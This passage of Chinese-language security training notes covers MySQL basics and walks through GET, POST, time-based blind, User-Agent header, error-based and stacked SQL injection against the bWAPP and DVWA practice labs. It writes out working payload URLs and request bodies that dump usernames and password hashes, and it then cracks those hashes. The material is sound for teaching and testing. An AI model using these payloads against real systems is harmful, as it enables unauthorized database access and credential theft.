  - 因此Fuzz多用于非生产环境，在生产环境使用要十分慎重。 



#### 防御措施 

- 文件类型检测：白名单 优于 黑名单
- 使用安全的函数进行编程
- 熟悉业务部署环境的OS、Web Server配置 





### MySQL基础

#### 数据库 

- 数据库就是一个存储数据的仓库。
- 数据库是以一定方式储存在一起、能与多个用户共享、具有尽可能小的冗余度、与应用程序彼此独立的数据集合。
- 它的存储空间很大，可以存放百万条、千万条、上亿条数据。 



#### 关系数据库

- 关系型数据库，存储的格式可以直观地反映实体间的关系。关系型数据库和常见的表格比较相似，关系型数据库中表与表之间是有很多复杂的关联关系的。
- 常见的关系型数据库有Mysql，SqlServer等。



#### 非关系型数据库（NoSQL）

- 随着近些年技术方向的不断拓展，大量的NoSql数据库如MongoDB、Redis、Memcache出于简化数据库结构、避免冗余、影响性能的表连接、摒弃复杂分布式的目的被设计。
- NoSQL数据库适合追求速度和可扩展性、业务多变的应用场景。 



#### MySQL 

- MySQL 是最流行的关系型数据库管理系统。
- 在 Web 应用方面 MySQL 是最好的 RDBMS(Relational Database Management System：关系数据库管理系统)应用软件之一。 
- 关系型数据库管理系统
- 瑞典 MySQL AB 公司开发，目前属于 Oracle 公司
- MySQL 是开源的，所以你不需要支付额外的费用
- MySQL 使用标准的 SQL 数据语言形式
- MySQL 可以运行于多个系统上，并且支持多种语言。
- 这些编程语言包括 C、C++、Python、Java、Perl、PHP、Eiffel、Ruby 和 Tcl 等
- MySQL 对PHP有很好的支持，PHP 是目前最流行的 Web 开发语言
- MySQL 是可以定制的，采用了 GPL 协议，你可以修改源码来开发自己的 MySQL 系统。 
- 下载官网：https://dev.mysql.com/downloads/
- 学习MySQL相关文档：https://www.mysqlzh.com/



#### Docker 安装 MySQL

- 查找MySQL的版本：docker search mysql
- 下载mysql的镜像：docker pull mysql:8.0.23
- 查看镜像的名字：docker images
- 启动容器镜像（更改运行的默认端口，并设置密码）：docker run --name mysql-test -itd -p 3307:3307 -e MYSQL_ROOT_PASSWORD=123456 mysql:8.0.23
- 拷贝mysql的配置文件到桌面，docker cp mysql-test:/etc/mysql/my.cnf ./
- 更改配置文件中的端口信息，添加 port=3307
- 重新复制桌面的配置文件到MySQL容器中，docker cp ./my.cnf mysql-test:/etc/mysql/my.cnf
- 重启容器，docker restart mysql-test
- 查看容器启动结果：docker ps
- 使用navicat 连接mysql
  - 用户名 root
  - 密码 123456
  - 端口 3307
- 使用命令行链接mysql
  - docker exec -it mysql-test bash
  - mysql -uroot -p 123456



#### Docker 安装 Linux

- 在实际的演示中，会使用到linux系统，但是直接使用VMWare安装，比较麻烦，所以直接借助于 docker 安装linux了
- 安装的版本是 centos linux
- 安装命令
  - docker search centos
  - docker pull centos
  - docker images
  - dockerdocker run -d -i -t imageID /bin/bash
  - docker container list -a
  - docker ps
  - docker attach busy_blackwell
    - 进入交互式界面，可以执行命令了







#### RDBMS术语

- 数据库: 数据库是一些关联表的集合
- 数据表: 表是数据的矩阵。在一个数据库中的表看起来像一个简单的电子表格。
- 列: 一列(数据元素) 包含了相同类型的数据, 例如邮政编码的数据。
- 行：一行（=元组，或记录）是一组相关的数据，例如一条用户订阅的数据。 



#### 对数据库进行操作 

- 显示数据库列表 show databases;
- 进入对应的数据库 use “指定数据库名”;
- 查看所进入数据库的所有表 show tables; 

- 显示数据库版本 select version();
- 查看当前正在使用的数据库 select database();
- 查看使用当前数据库的用户 select user(); 
- 查看数据库路径 select @@datadir;
- 查看安装路径 select @@basedir;
- 查看数据库安装的操作系统 select @@version_compile_os; 



#### 初始数据库

- mysql 安装之后会出现四个数据库
  - information_schema
  - mysql
  - performance_schema
  - sys 



#### information_schema 

- information_schema ，是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的信息。如数据库名，数据库的表，表栏的数据类型与访问权限等。
  - Web渗透过程中用途很大
  - SCHEMATA表：提供了当前MySQL实例中所有数据库的信息。是show databases的结果取之此表。
    - select * from schemata;
    - 上条命令是  show databases; 的超集。
  - TABLES表：提供了关于数据库中的表的信息（包括视图）。
  - COLUMNS表：提供了表中的列信息。详细表述了某张表的所有列以及每个列的信息。
- 测试该信息数据库
  - 创建数据库 test：create database test;
  - 创建数据表 test：create table test (‘id’ int(11), ‘user’ varchar(55));
  - 查看数据表的结构：describe test;
  - SCHEMATA表：select * from information_schema.schemata;
  - TABLES表：select * from information_schema.tables where table_schema='test';
  - COLUMNS表：select * from information_schema.columns where table_name='test'; 



#### mysql

- MySQL的核心数据库，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。



#### performance_schema

- 内存数据库，数据放在内存中直接操作的数据库。相对于磁盘，内存的数据读写速度要高出几个数量级，将数据保存在内存中相比从磁盘上访问能够极大地提高应用的性能。 



#### sys

- 通过这个数据库数据库，可以查询谁使用了最多的资源 基于IP或是用户。哪张表被访问过最多等等信息 



#### SQL基础 

- MySQL 数据库使用SQL SELECT语句来查询数据。
  - SELECT column_name,column_name FROM table_name [WHERE Clause] \[LIMIT N][ OFFSET M];
- 插入数据到指定表的语句
  - insert into test values (1, 'test1'), (2, 'test2');
- 如果我们需要修改或更新 MySQL 中的数据，我们可以使用 SQL UPDATE 命令来操作。
  - UPDATE table_name SET field1=new-value1, field2=new-value2 [WHERE Clause];
- 使用 SQL 的 DELETE FROM 命令来删除 MySQL 数据表中的记录
  - DELETE FROM table_name [WHERE Clause] ;
- MySQL LIKE 子句
  - 有时候我们需要获取 runoob_author 字段含有 "COM" 字符的所有记录，这时我们就需要在 WHERE 子句中使用 SQL LIKE 子句。
  - SQL LIKE 子句中使用百分号 %字符来表示任意字符，类似于UNIX或正则表达式中的星号*。
  - 如果没有使用百分号 %, LIKE 子句与等号 = 的效果是一样的。
  - SELECT field1, field2,...fieldN FROM table_name WHERE field1 LIKE condition1 [AND [OR]] filed2 = 'somevalue';
- MySQL UNION 操作符
  - MySQL UNION 操作符用于连接两个以上的 SELECT 语句的结果组合到一个结果集合中。
  - 多个 SELECT 语句会删除重复的数据。
  - SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions] UNION [ALL | DISTINCT] SELECT expression1, expression2, ... expression_n FROM tables [WHERE conditions]; 



### GET 注入

#### SQL注入漏洞是什么？

是发生于应用程序与数据库层的安全漏洞。

网站内部直接发送的SQL请求一般不会有危险，但实际情况是很多时候需要结合用户的输入数据动态构造SQL语句，如果用户输入的数据被构造成恶意SQL代码，Web应用又未对动态构造的SQL语句使用的参数进行审查，则会带来意想不到的危险。



#### GET型SQL注入漏洞是什么？

我们在提交网页内容时候，主要分为GET方法，POST方法，GET方法提交的内容会显现在网页URL上，通过对URL连接进行构造，可以获得超出权限的信息内容。 



#### Web 程序三层架构

- 通常意义上就是将整个业务应用划分为
- 界面层 + 业务逻辑层 + 数据访问层
- 用户访问网页实际经过了如下流程

	1. Web浏览器中输入网址并连接到目标服务器；
	2. 业务逻辑层的Web服务器从本地存储加载index.php脚本并解析；
	3. 脚本连接位于数据访问层的DBMS，并执行SQL；
	4. 数据访问层的DBMS返回SQL的执行结果给Web Server；
	5. 业务逻辑层的Web Server将页面封装成HTML格式发送给表示层的浏览器；
	6. 表示层的浏览器解析HTML并将内容呈现给用户。 



#### 注入原理示意

- select id,name from test where id=?
  - ？ 是用户输入，替代为 1 or 1=1
- 实际上执行的SQL语句
  - select id,name from test where id=1 or 1=1
- 也即
  - select id,name from test 



#### SQL注入带来的威胁 

- 猜解后台数据库，盗取网站敏感信息
- 绕过验证登录网站后台
- 借助数据库的存储过程进行提权等操作 



#### GET 注入实战

- 安装，注册，并登录靶机

- 选择bug类型：Choose your bug: SQL Injection (GET/Search)

- 查找注入点 - 尝试输入看看反馈信息 

  - 可能SQL语句 select * from table where name=‘2’
  - 构造SQL语句 select * from table where name=‘2‘’ 

- 查找注入点 – 思考 

  - 为什么要通过输入 ’ 的方式来查找注入点呢？ 
  - 测试test表
    - select * from test where name='test1';  -- 可以执行
    - select * from test where name='test1'';  -- 无法执行，产生错误
  - 从执行结果来看，’ 被直接引入了SQL构造语句，使其产生了错误。 

- 尝试UNION是否生效 - 构造其他SQL语句 

  - 打开HackBar ，在title=e后面添加 'union select 1,2 -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1,2 -- '&action=search

- 尝试UNION是否生效 – 思考 

  - UNION 语句的作用是什么？
  - SELECT 1,2 的作用是什么？
  - -- 的作用是什么？ 

  ![1617098333173](HackerMeWeb.assets/1617098333173.png)

- UNION生效 – 测试字段数量 - 构造其他SQL语句 

  - 尝试添加更多的数字，在title=e后面添加 'union select 1,2,3,4,5,6,7 -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, user(), database(), table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() -- '&action=search
  - 直到展示的数据中出现数字

- 测试字段数量成功 - 替换其中的选项 - 获取数据库详细信息 

  - 在title=e后面添加 'union select 1, user(), database(), table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, user(), database(), table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() -- '&action=search
  - 出现数据库的详细信息，看到 users 表
  - 重点：利用 NFORMATION_SCHEMA.tables 表

- 成功获取数据库信息 - 发现users表 - 进行users表结构信息获取 

  - 在title=e后面添加 'union select 1, column_name,2,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name = 'users' -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, column_name,3,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name = 'users' -- ' &action=search
  - 重点：利用 NFORMATION_SCHEMA.columns 表

- 已知表信息结构 - 进行表内容信息获取 

  - 在title=e后面添加 'union select 1, login,password,4,5,6,7 from users -- ' 
  - 完整地址为：http://xforburp.com/sqli_1.php?title=e'union select 1, login,password,4,5,6,7 from users -- '  &action=search

- 查询到用户名和密码 – 密码加密了 

  - 6885858486f31043e5839c735d99457f045affd0 
    - 一看就是md5
    - 直接解密
    - 肯定解不开 
  - Len(6885858486f31043e5839c735d99457f045affd0)==40
    - 明显不是md5
    - 至于为啥不是可以百度一下MD5算法，很简单
    - 回到正题，去CMD5解密，得到密码明文 

- 去在线MD5解密网站解密 

  - https://www.cmd5.com/
  - sha1 加密
  - 用户名：A.I.M. 密码 bug
  - 用户名：bee 密码 bug 

- 使用A.I.M账号登录，登录成功



### POST注入 

#### POST型SQL注入漏洞是什么？

- 在HTTP常用方法中，POST方法提交的信息不存储与URL，而是存储在HTTP实体内容中，在大多的提交过程，用户是无感知的。
- 且注入信息是存储于HTTP实体内容中而不是URL，通过改造实体内容，达到实际执行的SQL语句获取更多信息的目的。 



#### POST注入实战

- 安装，注册，并登录bWAPP 靶机

- 选择bug类型：Choose your bug: SQL Injection (POST/Select)

- 查看POST请求 

  - 使用 Burp Suite 进行请求的抓取
  - 查看到请求body的内容：movie=4&action=go

- Send to Repeater 

  - 右键，发送到repeater 进行重放攻击 
  - 进入 Repeater ，重新 Send 尝试不同body

- 构造输入，测试SQL注入点 

  - 当使用 movie=1’&action=go  的时候，会报错

- 使用 union 构造语句获取信息，尝试获取union参数个数 

  - body 的内容为：movie=4 union select 1,2 #&action=go 时候，可以看到内容
  - 继续添加显示的字段数量
  - body 的内容为：movie=4 union select 1,2,3,4,5,6,7 #&action=go 时候，成功显示数据
  - 但是看不到 可以展示的字段是哪个
  - body 的内容为：movie=11 union select 1,2,3,4,5,6,7 #&action=go时候，查询一个不存在的数据就可以展示出来数字对应的字段了

- 使用INFORMATION_SCHEMA.tables， 获取数据库详细信息 

  - body 的内容为：movie=11 union select 1,user(),database(),table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() # &action=go

  - 由于 table 只展示一条数据，无法展示出具体有多少个表

  - 服务端实现

    ![1617101098966](HackerMeWeb.assets/1617101098966.png)

- 通过猜测，进行数据表的模糊匹配

  - body 的内容为：movie=11 union select 1,user(),database(),table_name,version(),6,7 from INFORMATION_SCHEMA.tables where table_schema=database() and table_name like 'user%' # &action=go
  - 可以看到有一个 users 的数据表

- 进行users表结构信息获取 

  - body 的内容为：movie=11 union select 1,column_name,3,4,5,6,7 from INFORMATION_SCHEMA.columns where table_name='users' # &action=go
  - 只可以看到有一个字段是 id

- 进行 用户数据获取

  - 使用 password 进行模糊匹配？





#### 判断SQL注入点 

- 判断注入点时的关键点

  - 判断该访问目标 URL 是否存在 SQL 注入？
  - 如果存在 SQL 注入，那么属于哪种 SQL 注入？
  - TIPS：只要是带有参数的动态网页且此网页访问了数据库，那么就有可能存在 SQL 注入。 

- 判断SQL注入点 – 经典的单引号判断法 

  - http://xxx/test.php?id=1'
  - 如果页面返回错误，则存在 SQL 注入。
  - 原因是无论字符型还是整型都会因为单引号个数不匹配而报错。 

- 判断SQL注入点 – 判断注入类型 

  - 通常SQL注入分为两种：数字型 + 字符型
  - 数字型：
    - 通常语句类型为 select * from <表名> where id = x
    - 我们通常构造and 1=1以及and 1=2来判断
    - select * from test where id=1 and 1=1;
  - 字符型：
    - 通常语句类型为select * from <表名> where id = 'x'
    - 我们通常构造and '1'='1以及and '1'='2来判断 
    - select * from test where name='test1' and '1'='1';

- 判断SQL注入点 – 回归测试 

  - 打开靶机，设置为 SQL Injection (GET/Search)
  - 使用 http://xforburp.com/sqli_1.php?title=d%' and '1'='1'-- &action=search 测试
  - 不添加那个 % ，就无法获得数据
  - 来看一遍源码 ，cd /var/www/html， vim sqli_1.php

  ![1617098333173](HackerMeWeb.assets/1617098333173.png)

  - 可以看到SQL语句的写法是很多的，前面提到的SQL注入判断方式也不是万能药，要根据不同情况灵活调整。
  - 核心是什么？
  - 推测后端SQL语句的形态，尝试闭合SQL语句。 



#### “初级“注入防御方法 

- 减少错误信息反馈 

- 对输入特殊符号进行转义（黑名单） 

  - \$id=mysql_escape_string($id) 
  - 将对id中以下特殊进行转义：
  - \x00 \n \r \  ‘  “  \x1a
  - 如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。 
  - PHP API 进行转义，mysql_escape_string

  ![1617106154979](HackerMeWeb.assets/1617106154979.png)

- 对输入特殊词组进行过滤（黑名单） 

  - 常见的关键字：and、or、union 、select、空格等等过滤 



### 时间盲注 

#### SQL注入的不同类型 

- SQL注入主要分为以下5种
  - Boolean-based blind SQL injection（布尔型注入）
  - UNION query SQL injection（可联合查询注入）
  - Time-based blind SQL injection（基于时间延迟注入）
  - Error-based SQL injection（报错型注入）
  - Stacked queries SQL injection（可多语句查询注入） 

- Boolean-based（布尔型注入）
  - http://test.com/view?id=1 and substring(version(),1,1)=5
  - 如果服务端MySQL版本是5.X的话，那么页面返回的内容就会跟正常请求一样。 
- UNION（联合查询注入）
  - http://test.com/view?id=1 UNION ALL SELECT SCHEMA_NAME FROM INFORMATION_SCHEMA.SCHEMATA
  - 最快捷的方法，通过UNION查询获取到所有想要的数据，前提是请求返回后能输出SQL执行后查询到的所有内容。 
- Time-based（基于时间延迟注入）
  - select * from user where id= ‘4’ and sleep(3)
  - 页面不会返回错误信息，不会输出UNION注入所查出来的泄露的信息。
  - 类似搜索这类请求，boolean注入也无能为力，因为搜索返回空也属于正常的，这时就得采用time-based的注入了，即判断请求响应的时间，但该类型注入获取信息的速度比较慢，请求次数比较多，纯手工非常复杂。 
- Error-based（报错型注入）
  - 如果页面能够输出SQL报错信息，则可以从报错信息中获得想要的信息。
  - 典型的就是利用group by的duplicate entry错误。 
- Stacked queries（多语句查询型注入）
  - http://test.com/view?id=1;update t set name = ‘a‘ where id=1 
  - 能够执行多条查询语句，非常危险，因为这意味着能够对数据库直接做更新操作。 



#### 时间盲注定义

- 时间盲注是什么？ 
  - 通过注入特定语句，根据对页面请求的物理反馈，来判断是否注入成功，如： 在SQL语句中使用sleep() 函数看加载网页的时间来判断注入点。
  - 适用场景：通常是无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知。 





#### 时间盲注原理 

- 原理示意
  - select * from user where id= ‘ ？’
    - ？ 用户输入，替代为 4’ and sleep(3) -- ‘
  - 实际上执行的SQL语句：
    - select * from user where id= ‘4’ and sleep(3) -- ‘’
  - 当id=4存在时，休眠3秒
  - 当id=4不存在时，直接返回
  - 整条拼接出来的SQL是正确的就执行最后的sleep，前面错误（不存在），sleep(3)不执行。 



#### 时间盲注常用函数

- substr(a,b,c)：从b位置开始，截取字符串a的c长度
- count()：计算总数
- ascii()：返回字符的ASCII码
- length()：返回字符串的长度
- left(a,b)：从左往右截取字符串a的前b个字符
- sleep(n)：将程序挂起n秒
- 还有很多函数可以挖掘，如binary等，同学们理解了盲注的原理后可以到 MySQL官网的Reference去学习。 



#### 时间盲注实战

- 安装，注册，并登录靶机

- 选择bug类型：Choose your bug: SQL Injection - Blind - Time-Based

- 注入尝试

  - 尝试使用错误注入，布尔注入
  - 均无反馈信息（这一点很重要）
  - 尝试其他内容 

- 时间注入 

  - 使用or的方式：http://xforburp.com/sqli_15.php?title=1' or sleep(2) -- &action=search
  - 浏览器一直转圈圈，2秒后获得请求而停止
  - 使用and的方式：http://xforburp.com/sqli_15.php?title=World War Z' and sleep(2) -- &action=search

- 数据库名字长度获取

  - 由于注入点不能反馈信息，所以不能像前面两个注入方式那样直接简洁地获取数据库信息，需要从侧面一步步拼凑信息。 
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())=1 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())>1 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())>5 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())>4 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(database())=5 and sleep(2) -- &action=search
  - 最终确定数据库名称的长度是5

- 数据库名字的第一个字母获取 

  - http://xforburp.com/sqli_15.php?title=World War Z' and substr(database(),1,1)='a' and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and substr(database(),1,1)='b' and sleep(2) -- &action=search
  - 通过一个一个的比对，确定数据库名字第一个字母是什么

- 数据库版本名称长度获取 

  - http://xforburp.com/sqli_15.php?title=World War Z' and length(version())=5 and sleep(2) -- &action=search
  - http://xforburp.com/sqli_15.php?title=World War Z' and length(version())=23 and sleep(2) -- &action=search

- 实际情况

  - 在实际情况中，版本名称不仅只有字母也可能有其他特殊字符，一个一个尝试终究是有遗漏
    的，而且手工输入时间耗时较久，需要通过程序解决。 

- ASCII表 

  ![1617177603495](HackerMeWeb.assets/1617177603495.png)

- 使用ASCII编码的方式测试

  - http://xforburp.com/sqli_15.php?title=World War Z' and ascii(substr(database(),1,1))=98 and sleep(2) -- &action=search

- 自动化程序编写 

  - bWAPP需要登录 ，携带 cookie 信息
  - Python 2.7.9 + 或 Python 3.4+ 以上版本都自带 pip 工具，如无，单独下载后安装 requests 模块。 
  - 程序参见：
    - HackerMeCode\SQLInjectTimeBases\sqlInjection-time_py2.py
    - HackerMeCode\SQLInjectTimeBases\sqlInjection-time_py3.py
    - 通过程序，可以获得数据库的名称

- Requests 模块学习

  - https://github.com/psf/requests
  - https://docs.python-requests.org/en/master/





### HTTP头注入 

#### HTTP头注入是什么

- 针对HTTP的请求头，如果不加以过滤或者转义，在直接与数据库交互的过程中容易被利用进行SQL注入攻击，即HTTP头注入。
- 常见场景：
  - 访问Web Server时，Web Server会从HTTP Header中取出浏览器信
    息、IP地址、HOST信息等存储到数据库中。 



#### HTTP头注入实战

- 安装，注册，并登录靶机

- 选择bug类型：Choose your bug: SQL Injection - Stored (User-Agent)

- 通过Burp Suite抓包拦截请求 

  - 右键 Send to Repeater
  - 在 Repeater 中重新 send ，查看内容

- 推测后端SQL语句的形态，尝试闭合SQL语句。 

  - 更改为：User-Agent: 123
  - 更改为：User-Agent: 123'
  - 更改为：User-Agent: 111','222'); #
  - 更改为：User-Agent: 111', sleep(2)); #

- 猜测后端SQL语句形态：

  - INSERT INTO … VALUES (xxx,yyy);  

- 让我们进入Docker验证一下吧

  - cd /var/www/html/

  - 从浏览器的地址栏可以看到访问的事*17.php

  - vim sqli_17.php

  - 发现下面这段保存数据到数据库的逻辑代码

    ![1617179730172](HackerMeWeb.assets/1617179730172.png)



### 报错注入 

#### 报错注入定义

- 报错注入（Error based Injection）
- 是一种 SQL 注入的类型，用于使 SQL 语句报错的语法，用于注入结果无回显但错误信息有输出的情况。
- 返回的错误信息即是攻击者需要的信息。 



#### 报错注入原理

- 报错注入（Error based Injection）
- MySQL 的报错注入主要是利用 MySQL 的一些逻辑漏洞，如 BigInt 大数溢出等，由此可以将 MySQL 报错注入主要分为以下几类：

1. BigInt 等数据类型溢出；
2. Xpath 语法错误；
3. count() + rand() + group_by() 导致重复；
4. 空间数据类型函数错误。 



#### 报错注入函数

很多函数会导致 MySQL 报错并显示出数据：
1. floor 函数；
2. extractvalue 函数；（最多32字符）
3. updatexml 函数；
4. exp() 函数； 



#### 函数 - rand([N]) 

- rand([N]) - 返回一个随机浮点数 v，范围是 0<=v<1.0
- N 是可选提供的，如果提供了N，则会设定N为一个SEED 
- 测试SQL:
  - select rand() from test;
    - 每一次返回的随机数都是不一样的
  - select rand(0) from information_schema.tables limit 1,10;
    - 每一次返回的随机数都是相同的
  - select rand() from information_schema.tables limit 1,10;
    - 每一次返回的随机数都是不一样的
- 官方解释rand 函数
  - https://dev.mysql.com/doc/refman/8.0/en/mathematical-functions.html#function_rand
  - [`RAND()`](https://dev.mysql.com/doc/refman/8.0/en/mathematical-functions.html#function_rand) in a `WHERE` clause is evaluated for every row (when selecting from one table) or combination of rows (when selecting from a multiple-table join). 



#### 函数 - floor(x) 

- floor(x) - 返回不大于 x 的最大整数 
- 测试SQL:
  - select floor(0.1), floor(0.50), floor(0.99), floor(1.9), floor(2.1);



#### 函数 - count(x) 

- count(x) - 返回 x 数据集的数量 
- 测试SQL:
  - select * from test;
  - select count(*) from test;
  - select count(*) from test where id=1;



#### 函数 - concat(x) 

- 测试SQL:
  - select count(\*),concat((select user()), floor(rand(0)*2)) x from test group by x;
    - 没报错，输出 2 | root@localhost1
  - insert into test values (1, 'test3');  -- 插入重复的 ID 数据
  - select * from test;
  - select count(\*),concat((select user()),floor(rand(0)*2))x from test group by x;
    - 报错了，输出 ERROR 1062 (23000): Duplicate entry 'root@localhost1' for key 'group_key'
- 思考：为什么会触发错误呢？ 
- 继续测试
  - select floor(rand(0)*2) from information_schema.tables limit 1,10;
  - 结合 rand 函数的特性，继续思考函数报错的原因 
    - 在进行 group by 的时候，会出现创建一个虚拟表的操作，使用的主键是 x
    - 查询主键 0，不存在，直接插入
    - 插入时重新计算，主键成为1
    - 查询主键1，存在，直接增加1
    - 查询主键0，主键不存在，直接插入
    - 插入时重新计算，主键成为1，无法插入数值为1的主键（主键1的内容已经存在）
      - 主键插入冲突 --> 报错 
      - Duplicate 



#### 函数 - extractvalue 

- 报错注入 pyload 原理（ EXTRACTVALUE ） 
  - ?id=1' and extractvalue(1, concat(0x7e, (select @@version))) -- ' 
- 测试SQL:
  - select @@version;
  - select extractvalue(1, (select @@version));
    - 报错，ERROR 1105 (HY000): XPATH syntax error: '.43'
  -  select extractvalue(1, concat(0x7e, (select @@version)));
    - 报错，ERROR 1105 (HY000): XPATH syntax error: '~5.6.43'
- 思考：
  1. 为什么要使用 concat 函数呢？
     1. 将报错触发条件，与有价值的数据结合在一起
  2. 0x7e 是什么？ 
     1. 0x7e 是一个 ~，可以保证其无法被执行，而报错



#### 函数 - updatexml 

- 报错注入 payload 原理（ UPDATEXML ） 
  - ?id=2' and updatexml(1,concat(0x7e,(SELECT @@version)),1) -- ' 
- 测试SQL:
  - select updatexml(1,concat(0x7e,(select @@version)),1);
    - 报错，ERROR 1105 (HY000): XPATH syntax error: '~5.6.43'



#### 函数 - exp 

- 报错注入 payload 原理（ exp ） 
  - 注意，exp() 产生错误，但是并没有爆出 database()，但是发现 database() 是表达式，在脚本语言中会转化为相应的值，从而爆出数据库名。 
- 测试SQL:
  - select exp(~(select * from (select database()) x));
    - 报错，ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select `x`.`database()` from (select database() AS `database()`) `x`)))'
  - select * from (select database()) x;
  - select ~(select * from (select database()) x);
    - 输出， 18446744073709551615



#### DVWA 容器安装

- 下载：docker pull registry.cn-shanghai.aliyuncs.com/yhskc/dvwa
- 运行：docker run -d -p 0.0.0.0:81:80 registry.cn-shanghai.aliyuncs.com/yhskc/dvwa
  - 容器内端口为80，映射为主机的81端口
- 测试：
  - http://127.0.0.1:81/
  - 用户名：admin
  - 密码：password





#### 报错注入实战

- 安装，并登录靶机
- 选择bug类型：SQL Injection
- 使用 单引号 测试
  - http://127.0.0.1:81/vulnerabilities/sqli/?id='&Submit=Submit#
  - 报错，You have an error in your SQL syntax; check the manual that corresponds to your MariaDB server version for the right syntax to use near ''''' at line 1
- 使用 extractvalue 函数 进行报错注入
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,(select @@version))  -- &Submit=Submit#
  - 报错，XPATH syntax error: '.26-MariaDB-0+deb9u1'
- 获取 用户 和 数据库内容
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, user(), 0x7e, database()))  -- &Submit=Submit#
  - 报错，XPATH syntax error: '\~app@localhost~dvwa'
- 通过information_schema.tables，获取数据表名称
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select table_name from information_schema.tables where table_schema='dvwa' limit 0,1)))  -- &Submit=Submit#
  - 通过更改限制，或者用户表 users
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select table_name from information_schema.tables where table_schema='dvwa' limit 2,1)))  -- &Submit=Submit#
- 通过information_schema.columns，获取用户表字段
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 0,1)))  -- &Submit=Submit#
  - 通过更改限制，或者用户表 的字段 user 与 password
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 3,1)))  -- &Submit=Submit#
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select column_name from information_schema.columns where table_name='users' limit 4,1)))  -- &Submit=Submit#
- 获取用户名和密码
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select user from dvwa.users limit 0,1)))  -- &Submit=Submit#
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,concat(0x7e, (select password from dvwa.users limit 0,1)))  -- &Submit=Submit#
  - 问题：密码长度超过32位，导致真正的加密密码只有31位，不全
- Mid() 函数
  - 用于从文本字段中提取字符，自定义长度与起始位置
  - MID( string, start_position, length )
  - link：https://www.techonthenet.com/mysql/functions/mid.php
- 获取真正的密码
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,mid(concat(0x7e, (select password from dvwa.users limit 0,1)), 1, 29))  -- &Submit=Submit#
    - 获得，XPATH syntax error: '~5f4dcc3b5aa765d61d8327deb882cf9'
  - http://127.0.0.1:81/vulnerabilities/sqli/?id=' and extractvalue(1,mid(concat(0x7e, (select password from dvwa.users limit 0,1)), 29, 29))  -- &Submit=Submit#
    - 获得，XPATH syntax error: 'cf99'
  - 真正的密码为，5f4dcc3b5aa765d61d8327deb882cf9cf99
  - https://www.cmd5.com/ 解密，得到明文密码为 password
- 扩展练习
  - 通过 floor 报错,注入语句如下:
    - select 1 from (select count(\*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a;
  - 通过 exp 报错,注入语句如下:
    - select exp(~(select * from (select user())x)); 



### 堆叠注入 

#### 堆叠注入定义 

- 堆叠注入（Stacked Injections） 
  - 一堆 SQL 语句(多条)一起执行。
  - 在 MySQL 中, 主要是命令行中, 每一条语句结尾加; 表示语句结束。这样我们就想到了是不是可以多句一起使用。
  - 这个叫做 stacked injection。
- 测试SQL:
  - select * from test;
  - select * from test where id=1; select * from test where id=2;
  - select * from test; update test set name='updated_test' where id=2;
  - select * from test;
- 在 ; 结束一个SQL语句后继续构造下一条语句，使多条语句顺序执行，这就是
  堆叠注入。
- 思考：union injection（联合注入）也是将两条语句合并在一起，两者之间有什么
  区别么？ 
  - union或者union all执行的语句类型是有限的，只可以用来执行查询语句，而堆叠注入可以执行任意的语句。
  - 注意：场景少，但是威力大！ 
- 并不是每一个环境下都可以执行，很可能受到API或者数据库引擎不支持的限制，同时权限不足也是面临的主要问题。
- 真实环境中：
  1. 通常只返回一个查询结果，因此，堆叠注入第二个语句产生错误或者结果只能被忽略，我们在前端界面是无法看到返回结果的；
  2. 在使用堆叠注入之前，我们也是需要知道一些数据库相关信息的，例如表名，列名等信息。 



#### PHP - MySQL相关API 

- mysqli_multi_query 及 mysqli_use_result 

![1617200228462](HackerMeWeb.assets/1617200228462.png)

- API 测试

  - 安装，并登录 DVWA 靶机 的 docker bash 交互式环境

    - docker ps
    - docker exec -it inspiring_agnesi bash

  - 找到 SQL Injection 的服务文件

    - cd /var/www/html/vulnerabilities/sqli/source/
    - vim low.php

  - 打开文件，注释掉mysqli_query，并新增mysqli_multi_query 

    - ![1617200491634](HackerMeWeb.assets/1617200491634.png)

    - ```php
      mysqli_multi_query($GLOBALS["___mysqli_ston", $query]);
      $result = mysqli_use_result($GLOBALS["___mysqli_ston"]);
      ```

  - 测试更新 API 后的功能

    - 输入 1 ，submit，获得结果



#### 堆叠注入实战

- 使用报错注入获得的已知信息
  - 包含数据库结构，数据表结构及用户账户信息
